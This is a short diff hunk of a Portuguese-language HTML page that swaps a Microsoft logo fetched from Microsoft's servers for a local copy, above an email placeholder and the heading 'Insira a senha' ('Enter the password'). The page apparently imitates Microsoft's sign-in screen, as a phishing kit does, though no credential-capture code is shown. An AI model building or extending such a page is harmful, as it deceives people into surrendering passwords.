@@ -24,7 +24,7 @@
                 <div class="card">
                     <div class="card-content">
                             <br>
-                            <img src="https://auth.gfx.ms/16.000.27887.2/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9"/>
+                            <img src="Images/nomemicrosoft.png"/>
                             <br><br><a href="index.html"><-</a>${email}<br>
 
                             <h5><b>Insira a senha</b></h5>
